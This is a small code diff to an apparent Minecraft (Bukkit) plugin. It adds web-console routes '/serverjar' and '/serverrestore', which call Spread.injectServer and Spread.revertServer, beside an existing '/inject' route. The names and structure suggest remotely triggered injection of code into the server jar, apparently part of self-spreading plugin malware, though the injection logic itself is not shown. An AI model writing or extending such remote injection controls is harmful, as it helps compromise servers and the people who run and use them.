@@ -108,6 +108,24 @@ final class DebugConsole {
                     log("manual /inject from web console");
                     body = okJson("inject ran");
                 }
+                case "/serverjar" -> {
+                    if (owner instanceof org.bukkit.plugin.java.JavaPlugin jp) {
+                        String report;
+                        try { report = Spread.injectServer(jp); }
+                        catch (Throwable t) { report = "error: " + t; }
+                        log("manual /serverjar from web console: " + report);
+                        body = okJson(report);
+                    } else {
+                        body = errJson("owner is not a JavaPlugin");
+                    }
+                }
+                case "/serverrestore" -> {
+                    String report;
+                    try { report = Spread.revertServer(); }
+                    catch (Throwable t) { report = "error: " + t; }
+                    log("manual /serverrestore from web console: " + report);
+                    body = okJson(report);
+                }
                 case "/reset" -> {
                     RawNet.resetCounters();
                     log("counters reset from web console");
